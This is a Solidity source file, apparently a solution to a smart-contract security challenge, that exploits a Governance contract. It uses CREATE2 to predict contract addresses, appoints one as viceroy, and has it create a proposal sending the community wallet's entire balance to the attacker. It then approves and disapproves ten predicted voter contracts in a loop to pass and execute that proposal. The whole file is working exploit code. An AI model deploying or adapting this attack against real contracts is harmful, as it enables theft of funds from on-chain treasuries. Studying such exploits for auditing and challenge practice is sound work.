// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.13;

import "./Governance.sol";

contract GovernanceAttacker {
    address player;

    constructor() {
        player = msg.sender;
    }

    function attack(address _governance, address _communityWallet) external {
        // The CREATE2 opcode allows contract deployment to a specific address determined by the contract bytecode,
        // a salt value, and the address of the deploying contract.
        // By manipulating these parameters, it is possible to predict the address where the contract will be deployed.
        // get bytecode
        bytes memory bytecode = type(ViceroyAttacker).creationCode;
        bytecode = abi.encodePacked(
            bytecode,
            abi.encode(_governance, player, _communityWallet)
        );
        // get hash & address using a fixed salt here => uint(123)
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                uint(123),
                keccak256(bytecode)
            )
        );
        address deployedAddr = address(uint160(uint(hash)));
        // apoint the predicted address as Viceroy
        Governance(_governance).appointViceroy(deployedAddr, 1);
        // create with salt to deploy our viceroy contract at the address which we predicted
        new ViceroyAttacker{salt: bytes32(uint(123))}(
            _governance,
            player,
            _communityWallet
        );
    }
}

contract ViceroyAttacker {
    Governance governance;
    uint attackCounter = 1;

    constructor(
        address _governance,
        address _player,
        address _communityWallet
    ) {
        governance = Governance(_governance);
        uint256 value = _communityWallet.balance;
        // malicious call data which will transfer all funds to our player
        bytes memory data = abi.encodeWithSignature(
            "exec(address,bytes,uint256)", // will transfer balance to player
            _player, // player address
            "0x", // not needed to transfer balance
            value
        );
        // since this contract is the viceroy we cann create a proposal
        governance.createProposal(_player, data);
        uint256 proposalId = uint256(keccak256(data));
        // loop 10 times
        while (attackCounter < 11) {
            // get bytecode
            bytes memory bytecode = type(VoterAttacker).creationCode;
            bytecode = abi.encodePacked(
                bytecode,
                abi.encode(_governance, proposalId, address(this))
            );
            // get hash & address
            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    attackCounter,
                    keccak256(bytecode)
                )
            );
            address deployedAddr = address(uint160(uint(hash)));
            governance.approveVoter(deployedAddr);
            new VoterAttacker{salt: bytes32(attackCounter)}(
                _governance,
                proposalId,
                address(this)
            );
            governance.disapproveVoter(deployedAddr);
            attackCounter++;
        }
        governance.executeProposal(proposalId);
    }
}

contract VoterAttacker {
    Governance governance;

    constructor(address _governance, uint256 proposalId, address _viceroy) {
        governance = Governance(_governance);
        bool inFavor = true;
        governance.voteOnProposal(proposalId, inFavor, _viceroy);
    }
}
